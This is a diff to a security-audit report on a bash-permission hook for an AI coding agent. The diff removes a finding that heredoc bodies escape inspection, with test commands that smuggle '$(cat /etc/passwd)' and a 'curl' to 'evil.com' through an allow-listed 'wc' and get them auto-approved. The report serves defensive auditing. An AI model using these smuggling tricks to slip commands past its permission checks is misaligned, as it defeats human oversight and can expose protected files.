@@ -17,46 +17,6 @@ Config under test: `~/.config/devin/lovely-permissions.jsonc` (default wildcard
 
 ---
 
-## 1. 🔴 Heredoc bodies bypass every security check
-
-**Area:** `src/lovely_bash_permissions/rules.py` (redirection target handling),
-`evaluate.py` (subshell/blocked-path passes), `segments.py`
-
-shfmt exposes heredoc bodies in `Redir.Hdoc.Parts`, but the code reads only
-`Redir.Word` (the delimiter) and never recurses into `Hdoc`. Bash executes
-`$(...)`, backticks, and `$(<file)` inside **unquoted** heredocs at runtime, so
-dangerous content is invisible to blocked-path, allowed-command, and subshell
-checks.
-
-```bash
-# blocked-path bypass — reads /etc/passwd, auto-approved
-uv run lovely-devin-permissions -t $'wc -l <<EOF\n$(cat /etc/passwd)\nEOF'
-# → approve
-
-# bash file-read bypass into same blocked file
-uv run lovely-devin-permissions -t $'wc -l <<EOF\n$(</etc/passwd)\nEOF'
-# → approve
-
-# arbitrary command smuggling (curl to exfil endpoint)
-uv run lovely-devin-permissions -t $'wc -l <<EOF\n$(curl -s http://evil.com/x)\nEOF'
-# → approve
-
-# backtick variant
-uv run lovely-devin-permissions -t $'wc -l <<EOF\n`cat /etc/passwd`\nEOF'
-# → approve
-
-# control: the here-string equivalents ARE correctly denied
-uv run lovely-devin-permissions -t 'wc -l <<< "$(cat /etc/passwd)"'
-# → block
-```
-
-**Impact:** any allow-listed command that reads stdin (`wc`, `grep`, `head`,
-`tail`, `sort`, `rg`, `cat`, `echo`, ...) becomes a sandbox escape for reading
-blocked files or executing arbitrary commands. Defeats `blocked_paths_regex`
-entirely.
-
----
-
 ## 2. 🔴 ParseError falls back to `*` wildcard, bypassing all checks
 
 **Area:** `src/lovely_bash_permissions/evaluate.py:205-212`
@@ -245,7 +205,6 @@ argument is a double-quoted expansion.
 
 | # | Severity | Bug | Fix area |
 | --- | ---------- | ----- | ---------- |
-| 1 | 🔴 | Heredoc bodies (`<<EOF`) invisible to checks — blocked-path / command-substitution bypass | inspect/scan `Redir.Hdoc.Parts` |
 | 2 | 🔴 | ParseError → `*` wildcard; downgrades deny→ask, auto-approves under `*: allow` | `evaluate.py` ParseError branch |
 | 3 | 🔴 | `_item_to_anchored_pattern` matches first word only → narrow allow/deny rules over-grant/over-block | `rules.py` |
 | 4 | 🔴 | Hook label regex dead — every rewritten command re-asks in production | quote-stripping vs label regex |
